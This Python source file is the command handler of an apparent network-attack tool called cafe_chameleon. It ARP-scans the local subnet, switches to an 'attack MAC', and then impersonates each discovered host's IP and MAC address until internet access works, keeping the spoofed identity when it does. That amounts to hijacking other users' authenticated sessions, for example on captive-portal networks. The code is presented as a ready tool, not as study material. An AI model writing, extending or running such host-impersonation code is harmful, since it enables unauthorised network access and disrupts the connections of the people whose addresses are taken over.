"""
cafe_chameleon.cli.commands.simple - Command handler for 'simple' (Layer 2 ARP host enumeration & takeover).
"""

import ipaddress
import sys
import time

from cafe_chameleon.utils.signals import register_signal_handler, restore_and_exit, ScanSkipInterrupt, HijackSkipInterrupt
from cafe_chameleon.utils.state import set_restore_params
from cafe_chameleon.utils.tracing import trace
from cafe_chameleon.ui.console import (
    log_scan,
    log_main,
    log_plus,
    log_warning,
    log_hijack,
    set_scan_status,
    set_main_status,
    set_hijack_status
)
from cafe_chameleon.ui.prompts import ask_proceed, ask_restore
from cafe_chameleon.network.internet import has_internet
from cafe_chameleon.network.sysfs import wait_for_carrier
from cafe_chameleon.network.hijack import hijack, restore
from cafe_chameleon.network.mac import get_attack_mac, set_mac_address
from cafe_chameleon.scanners.detector import auto_detect_network_params, get_interface_details
from cafe_chameleon.scanners.arp_scanner import scan_subnet
from cafe_chameleon.scanners.orchestrator import deep_scan_subnet
from cafe_chameleon.scanners.resolver import is_valid_ipv4


def run_simple(args, quiet_header: bool = False) -> bool:
    """Main subcommand handler for 'simple' mode (Layer 2 ARP scan & host takeover)."""
    register_signal_handler()

    interface = getattr(args, "interface", None) or "wlan0"
    trace(f"[FEATURE] Initializing Simple mode execution on interface {interface}")
    wait_for_carrier(interface, timeout=5.0)
    auto_params = auto_detect_network_params(target_iface=interface)
    local_ip, local_mac = get_interface_details(interface)

    subnet_arg = getattr(args, "subnet", None)
    target_arg = getattr(args, "target", None)
    target_str = subnet_arg or target_arg
    is_deep = bool(subnet_arg)

    if not target_str and auto_params.get("cidr"):
        try:
            net_obj = ipaddress.ip_network(auto_params["cidr"], strict=False)
            target_str = str(net_obj)
        except ValueError:
            target_str = auto_params["cidr"]

    if not target_str and auto_params.get("gateway_ip") and is_valid_ipv4(auto_params["gateway_ip"]):
        gw_ip_parts = auto_params["gateway_ip"].split(".")
        if len(gw_ip_parts) == 4:
            target_str = f"{gw_ip_parts[0]}.{gw_ip_parts[1]}.{gw_ip_parts[2]}.0/24"

    if not target_str and local_ip and is_valid_ipv4(local_ip):
        local_ip_parts = local_ip.split(".")
        if len(local_ip_parts) == 4:
            target_str = f"{local_ip_parts[0]}.{local_ip_parts[1]}.{local_ip_parts[2]}.0/24"

    if not target_str:
        if quiet_header:
            log_warning("[-] Could not auto-detect target network subnet CIDR.")
            log_main("[-] Could not auto-detect target network subnet CIDR.")
            return False
        else:
            log_scan("[-] Could not auto-detect target network subnet CIDR.")
            log_main("[-] Could not auto-detect target network subnet CIDR.")
            sys.exit(1)

    try:
        network = ipaddress.ip_network(target_str, strict=False)
        if getattr(args, "wide", False) and network.prefixlen >= 24:
            network = network.supernet(new_prefix=22)
        target_str = str(network)
    except ValueError as e:
        log_scan(f"[-] Invalid target network string '{target_str}': {e}")
        log_main(f"[-] Invalid target network string '{target_str}': {e}")
        if quiet_header:
            return False
        sys.exit(1)

    set_scan_status(subnet=target_str, count=0, scan_type="Deep Scan" if is_deep else "ARP Probe")
    profile = getattr(args, "profile", None)
    set_main_status(interface=interface, profile=profile, ssid=auto_params.get("ssid"), status="Subnet Scanning")

    if not quiet_header:
        log_main(f"[*] Starting Subnet Scanning on {target_str}...")

    # Split subnets into smaller /26 chunks (64 IPs per block) for high reliability & smooth progress
    if network.prefixlen < 26:
        subnets = list(network.subnets(new_prefix=26))
    else:
        subnets = [network]

    gw_ip = auto_params.get("gateway_ip", "")
    gw_mac = auto_params.get("gateway_mac", "")
    netmask = auto_params.get("cidr", "").split("/")[1] if auto_params.get("cidr") and "/" in auto_params.get("cidr") else "24"
    broadcast = auto_params.get("broadcast", "")
    ipmask = auto_params.get("cidr", f"{local_ip}/{netmask}")

    set_restore_params(interface, local_mac, ipmask, broadcast, gw_ip, callback=restore, profile=profile)

    # Apply attack MAC address before running host discovery/takeover
    attack_mac = get_attack_mac(interface)
    trace(f"[FEATURE] Applying attack MAC {attack_mac} on {interface} for simple mode scan")
    set_mac_address(interface, attack_mac, profile=profile)

    # Initial internet check
    if auto_params.get("internet_access"):
        if not getattr(args, "force", False):
            log_scan("[+] Internet online.")
            log_main("[+] Internet online.")
            set_scan_status(subnet=target_str, scan_type="Internet Online")
            return True
        else:
            log_main("[!] Internet online (--force enabled). Continuing scan...")

    discovered_devices = []
    try:
        for sub in subnets:
            try:
                sub_str = str(sub)
                set_scan_status(subnet=sub_str, count=len(discovered_devices), scan_type="Deep Scan" if is_deep else "ARP Probe")

                if is_deep:
                    hosts = deep_scan_subnet(sub, interface, gateway_ip=gw_ip, gateway_mac=gw_mac, local_ip=local_ip, local_mac=local_mac, duration=30)
                else:
                    hosts = scan_subnet(sub, interface)

                # Deduplicate & filter local host
                unique_hosts = []
                seen_ips = set()
                for h in hosts:
                    if h["ip"] == local_ip:
                        continue
                    if h["ip"] not in seen_ips:
                        seen_ips.add(h["ip"])
                        unique_hosts.append(h)

                if unique_hosts:
                    log_scan(f"[+] Found {len(unique_hosts)} active host(s) on block {sub_str}:")
                    log_main(f"[+] Found {len(unique_hosts)} active host(s) on block {sub_str}:")
                    for host in unique_hosts:
                        tag = ""
                        if gw_ip and host["ip"] == gw_ip:
                            tag = " [GATEWAY IP]"
                        elif gw_mac and host["mac"].lower() == gw_mac.lower():
                            tag = " [GATEWAY MAC]"
                        log_scan(f"  -> {host['ip']:<15} {host['mac']}{tag}")
                        log_main(f"  -> {host['ip']:<15} {host['mac']}{tag}")
                        discovered_devices.append(host)

                    set_scan_status(count=len(discovered_devices))

                    # Attempt takeover
                    set_scan_status(scan_type="Host Impersonation")
                    log_main("[*] Testing discovered hosts for internet access...")
                    for host in unique_hosts:
                        try:
                            is_gw = (gw_ip and host["ip"] == gw_ip) or (gw_mac and host["mac"].lower() == gw_mac.lower())
                            if not is_gw:
                                log_hijack(f"[*] Impersonating host: IP {host['ip']} ({host['mac']})...")
                                set_hijack_status(ip=host['ip'], technique="Simple Impersonation Sweep", clear_section2=True)
                                hijack_success = hijack(interface, host['ip'], host['mac'], netmask, broadcast, gw_ip, profile=profile, bssid=auto_params.get("gateway_mac"))
                                if hijack_success:
                                    log_scan("[+] SUCCESS! Internet access established!")
                                    log_main(f"\033[92m[+] SUCCESS! Internet active via {host['ip']} ({host['mac']})!\033[0m")
                                    set_scan_status(scan_type="Internet Active")
                                    if not getattr(args, "force", False):
                                        return True

                                if getattr(args, "force", False):
                                    if not ask_proceed():
                                        log_scan("[-] Stopped after impersonation.")
                                        log_main("[-] Stopped after impersonation.")
                                        has_acc = hijack_success or has_internet()
                                        if ask_restore(default_restore=not has_acc):
                                            restore(interface, local_mac, ipmask, broadcast, gw_ip)
                                        else:
                                            log_plus("Keeping current network config.")
                                        return has_acc

                                time.sleep(0.5)
                        except HijackSkipInterrupt:
                            log_scan(f"\033[93m[-] Skipping host {host['ip']} (Ctrl+C)...\033[0m")
                            log_main(f"\033[93m[-] Skipping host {host['ip']} (Ctrl+C)...\033[0m")
                            continue
            except ScanSkipInterrupt:
                log_scan(f"\033[93m[-] Skipping subnet block {sub} (Ctrl+C)...\033[0m")
                log_main(f"\033[93m[-] Skipping subnet block {sub} (Ctrl+C)...\033[0m")
                continue

    except KeyboardInterrupt:
        if quiet_header:
            raise
        restore_and_exit("Ctrl+C received during scan.")

    set_scan_status(subnet=target_str, count=len(discovered_devices), scan_type="Completed")
    if len(discovered_devices) > 0:
        log_scan(f"\n[+] Scan complete. Total Discovered Hosts: {len(discovered_devices)}")
        log_main(f"[+] Scan complete. Total Discovered Hosts: {len(discovered_devices)}")
    else:
        log_scan("\n[+] Scan complete")
        log_main("[+] Scan complete")

    has_acc = has_internet()
    if getattr(args, "force", False):
        if ask_restore(default_restore=not has_acc):
            restore(interface, local_mac, ipmask, broadcast, gw_ip)
        else:
            log_plus("Keeping current MAC and network configuration.")
    else:
        if not has_acc:
            restore(interface, local_mac, ipmask, broadcast, gw_ip)
        else:
            log_plus("Internet verified. Preserving working MAC and network configuration.")
    return has_acc

